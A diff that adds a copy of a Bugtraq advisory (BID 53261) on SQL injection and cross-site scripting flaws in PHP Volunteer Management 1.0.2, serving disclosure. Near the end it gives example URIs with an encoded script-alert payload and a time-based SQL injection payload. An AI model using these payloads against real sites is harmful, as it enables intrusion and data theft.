@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid53261<p><b><span style="font-size: 18pt;">PHP Volunteer Management SQL Injection and Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/53261/info">info</a><br><a href="http://www.securityfocus.com/bid/53261/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/53261/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/53261/solution">solution</a><br><a href="http://www.securityfocus.com/bid/53261/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				53261
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2012-6504<br/>
+				
+					CVE-2012-6505<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 26 2012 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 19 2015 07:35AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				G13 
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SourceForge PHP Volunteer Management  1.0.2<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit the SQL-injection issue. The attacker must trick an unsuspecting victim into following a malicious URI to exploit the cross-site scripting issue.              <br/> <br/>The following example URIs are available:              <br/> <br/>Cross-site scripting:  <br/> <br/>http://www.example.com/mods/hours/data/get_hours.php?id=XSS&amp;amp;take=10&amp;amp;skip=0&amp;amp;page=1&amp;amp;pageSize=10    <br/> <br/>http://www.example.com/mods/hours/data/get_hours.php?id=%27%22%3Cscript%3Ealert%281%29;%3C/script%3E&amp;amp;take=10&amp;amp;skip=0&amp;amp;page=1&amp;amp;pageSize=10    <br/> <br/>SQL-injection:  <br/> <br/>http://www.example.com/mods/hours/data/get_hours.php?id=SQLi&amp;amp;take=10&amp;amp;skip=0&amp;amp;page=1&amp;amp;pageSize=10    <br/> <br/>http://www.example.com/mods/hours/data/get_hours.php?id=1%27%20AND%20SLEEP%285%29%20AND%20%27BDzu%27=%27BDzu&amp;amp;take=10&amp;amp;skip=0&amp;amp;page=1&amp;amp;pageSize=10
+	
+		<ul>
+</ul>
+</div>
